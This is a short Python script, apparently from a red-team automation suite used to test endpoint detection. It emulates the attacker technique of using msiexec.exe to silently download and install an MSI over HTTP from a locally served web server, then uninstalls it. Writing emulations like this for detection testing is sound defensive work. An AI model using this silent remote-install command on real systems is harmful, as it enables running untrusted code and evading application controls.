# Name: MsiExec with HTTP Installer
# RTA: msiexec_http_installer.py
# ATT&CK:
# Description: Use msiexec.exe to download an executable from a remote site over HTTP and run it.

import platform
import common


def main():
    # Check if running on Windows
    if platform.system() != 'Windows':
        common.log("This script only runs on Windows.")
        return common.UNSUPPORTED_RTA

    common.log("MsiExec HTTP Download")
    server, ip, port = common.serve_web()
    common.clear_web_cache()

    # Download and execute MSI file
    common.execute(["msiexec.exe", "/quiet", "/i", "http://%s:%d/bin/Installer.msi" % (ip, port)])

    common.log("Cleanup", log_type="-")

    # Uninstall the MSI file
    common.execute(["msiexec", "/quiet", "/uninstall", "http://%s:%d/bin/Installer.msi" % (ip, port)])

    server.shutdown()


if __name__ == "__main__":
    exit(main())
